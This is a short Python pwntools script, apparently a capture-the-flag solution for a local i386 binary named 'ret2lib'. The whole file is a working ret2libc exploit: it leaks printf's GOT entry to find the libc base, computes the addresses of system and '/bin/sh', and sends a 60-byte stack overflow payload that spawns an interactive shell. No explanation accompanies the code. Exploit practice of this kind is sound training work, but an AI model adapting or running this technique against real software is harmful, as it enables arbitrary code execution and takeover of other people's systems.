from pwn import*

context(arch='i386',os='linux')
context.log_level = 'debug'

elf = ELF('./ret2lib')
r = process('./ret2lib')
libc = elf.libc

printf_got = elf.got['printf']

r.recvuntil('(in dec) :')
r.sendline(str(printf_got))

r.recvuntil('0x')

printf_addr = int(r.recv(8),16)
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + list(libc.search("/bin/sh"))[0]

log.info('printf_addr = '+hex(printf_addr))
log.info('libc_base = '+hex(libc_base))
log.info('system_addr = '+hex(system_addr))
log.info('/bin/sh_addr = '+hex(binsh_addr))

r.recvuntil(':')

payload = ''
payload += 'A'*60
payload += p32(system_addr)
payload += 'AAAA'
payload += p32(binsh_addr)

r.send(payload)

r.interactive()
